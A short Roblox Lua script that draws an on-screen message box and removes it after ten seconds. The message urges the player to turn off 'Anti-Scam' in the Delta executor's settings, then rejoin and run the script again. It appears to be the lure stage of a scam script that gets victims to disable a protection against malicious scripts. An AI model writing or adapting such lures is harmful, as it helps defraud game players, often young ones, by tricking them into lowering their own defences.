-- Create the screen GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LoadingScreen"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

-- Create the background frame
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0.6, 0, 0.3, 0)
Frame.Position = UDim2.new(0.2, 0, 0.35, 0)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.BackgroundTransparency = 0.2
Frame.Parent = ScreenGui

-- Create the message label
local TextLabel = Instance.new("TextLabel")
TextLabel.Size = UDim2.new(1, -20, 1, -20)
TextLabel.Position = UDim2.new(0, 10, 0, 10)
TextLabel.BackgroundTransparency = 1
TextLabel.TextWrapped = true
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.TextSize = 24
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Text = "⚠️ Pls turn off Anti-Scam in the settings.\nDelta doesn't want us to get reach.\nRejoin and execute the script again."
TextLabel.Parent = Frame

-- Optional: Automatically remove after a few seconds
task.delay(10, function()
    ScreenGui:Destroy()
end)
